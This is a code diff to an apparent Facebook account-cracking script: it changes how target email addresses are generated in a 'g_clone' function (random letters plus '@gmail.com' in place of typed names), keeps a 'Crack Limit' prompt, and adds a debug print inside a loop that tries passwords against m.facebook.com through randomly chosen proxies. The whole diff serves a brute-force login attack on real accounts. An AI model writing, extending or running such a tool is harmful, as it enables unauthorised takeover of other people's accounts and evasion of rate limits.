@@ -934,15 +934,10 @@ def g_clone():
     user=[]
     os.system('clear')
     print(logo)
-    print(" Ex First : ayesha, kazim, SUMON ")
-    print(" Ex Last  : rajput, channa, aaraya ")
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    first = input(' [â¢] First Name : ')
-    last = input(' [â¢] Last Name  : ')
-    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    print(' Ex Domain : @gmail.com, @yahoo.com, @hotmail.com ')
-    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    domain = input(' [â¢] Domain : ')
+    first = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    last = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    domain = '@gmail.com'
     try:
         limit = int(input(' [â¢] Crack Limit : '))
     except ValueError:
@@ -1255,6 +1250,7 @@ def mbasic(uid,pwx,tl):
         for pw in pwx:
             nip=random.choice(xvx)
             proxs= {'http': nip}
+            print(uid)
             Session = requests.Session()
             free_fb = Session.get('https://m.facebook.com/').text
             data ={
